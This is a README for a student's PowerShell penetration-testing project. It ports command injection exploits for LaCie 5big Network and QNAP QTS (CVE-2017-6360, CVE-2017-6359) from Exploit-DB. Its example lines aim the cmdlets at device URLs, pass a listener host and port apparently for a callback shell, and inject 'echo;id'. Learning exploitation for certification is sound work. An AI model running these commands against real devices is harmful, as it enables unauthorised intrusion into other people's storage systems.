# Command Injection exploits

The following two comlets are based on exploits from exploitDB and have been ported to powershell.

The first exploit is for LaCie 5big Network 2.2.8 Command Injection, based on Timo Sablowski.

The second is for CVE-2017-6360 and CVE-2017-6359 for the QNAP QTS web user interface.

This blogpost has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam:
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3237

## Link

Code is located at https://github.com/tubesurf/PSPT

## Getting Started

Try and find a QNAP or a LACIE to play with...

## Example

Commands to run the commandlet...

```
PS C:> Command-Inject-LACIE -baseurl https://10.0.0.1:8443 -listner 192.168.1.1 -port 8080

PS C:> Command-Inject-QNAP -baseurl https://10.0.0.1 -method CVE-2017-6360 -command "echo;id"
PS C:> Command-Inject-QNAP -baseurl https://10.0.0.1 -method CVE-2017-6359 -command "echo;id"

```

## Acknowledgments


Timo Sablowski for the LaCie command injection exploit
* https://www.exploit-db.com/exploits/43226/

Encode special charaters, thanks to Prateik Singh
* https://geekeefy.wordpress.com/2017/05/26/encodedecode-your-url-with-powershell/
